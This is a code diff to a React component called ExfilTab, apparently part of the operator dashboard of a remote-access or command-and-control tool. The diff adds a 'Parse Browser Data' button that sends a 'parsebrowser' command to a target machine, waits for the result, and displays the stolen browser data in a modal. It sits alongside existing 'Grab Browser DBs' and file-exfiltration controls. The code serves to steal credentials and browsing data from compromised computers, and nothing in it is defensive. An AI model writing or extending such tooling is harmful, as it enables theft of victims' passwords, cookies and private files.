@@ -4,6 +4,12 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Badge } from "@/components/ui/badge";
 import {
+  Dialog,
+  DialogContent,
+  DialogHeader,
+  DialogTitle,
+} from "@/components/ui/dialog";
+import {
   Table,
   TableBody,
   TableCell,
@@ -19,9 +25,10 @@ import {
   FileArchive,
   Send,
   HardDrive,
+  Globe,
 } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
-import { dispatchCommand } from "@/lib/commands";
+import { dispatchCommand, waitForResult } from "@/lib/commands";
 import { toast } from "sonner";
 
 interface FileEntry {
@@ -38,6 +45,8 @@ const ExfilTab = ({ machineId }: { machineId: string }) => {
   const [loading, setLoading] = useState(false);
   const [requestPath, setRequestPath] = useState("");
   const [sending, setSending] = useState(false);
+  const [browserResult, setBrowserResult] = useState<string | null>(null);
+  const [parsingBrowser, setParsingBrowser] = useState(false);
 
   const fetchFiles = async () => {
     setLoading(true);
@@ -112,6 +121,25 @@ const ExfilTab = ({ machineId }: { machineId: string }) => {
     setSending(false);
   };
 
+  const requestParseBrowser = async () => {
+    setParsingBrowser(true);
+    const id = await dispatchCommand(machineId, "parsebrowser");
+    if (id) {
+      toast.success("Parsing browser data on target...");
+      const res = await waitForResult(id, 30000);
+      if (res?.result) {
+        setBrowserResult(res.result);
+      } else if (res?.status === "timeout") {
+        toast.error("Browser parse timed out");
+      } else {
+        toast.error("Browser parse failed");
+      }
+    } else {
+      toast.error("Failed to send command");
+    }
+    setParsingBrowser(false);
+  };
+
   const formatSize = (bytes: number | null) => {
     if (bytes === null || bytes === undefined) return "—";
     if (bytes < 1024) return `${bytes} B`;
@@ -166,6 +194,16 @@ const ExfilTab = ({ machineId }: { machineId: string }) => {
               disabled={sending}
             >
               <HardDrive className="w-3 h-3" /> Grab Browser DBs
+            </Button>
+            <Button
+              variant="outline"
+              size="sm"
+              className="gap-1.5 h-7 text-xs"
+              onClick={requestParseBrowser}
+              disabled={parsingBrowser}
+            >
+              {parsingBrowser ? <Loader2 className="w-3 h-3 animate-spin" /> : <Globe className="w-3 h-3" />}
+              Parse Browser Data
             </Button>
             <Button
               variant="outline"
@@ -255,6 +293,22 @@ const ExfilTab = ({ machineId }: { machineId: string }) => {
           )}
         </CardContent>
       </Card>
+      {/* Browser Parse Result Modal */}
+      <Dialog
+        open={!!browserResult}
+        onOpenChange={(open) => !open && setBrowserResult(null)}
+      >
+        <DialogContent className="sm:max-w-2xl max-h-[80vh]">
+          <DialogHeader>
+            <DialogTitle>Browser Data</DialogTitle>
+          </DialogHeader>
+          <div className="bg-[hsl(222,47%,4%)] rounded-lg p-4 font-mono text-xs max-h-[60vh] overflow-auto">
+            <pre className="text-gray-300 whitespace-pre-wrap">
+              {browserResult}
+            </pre>
+          </div>
+        </DialogContent>
+      </Dialog>
     </div>
   );
 };
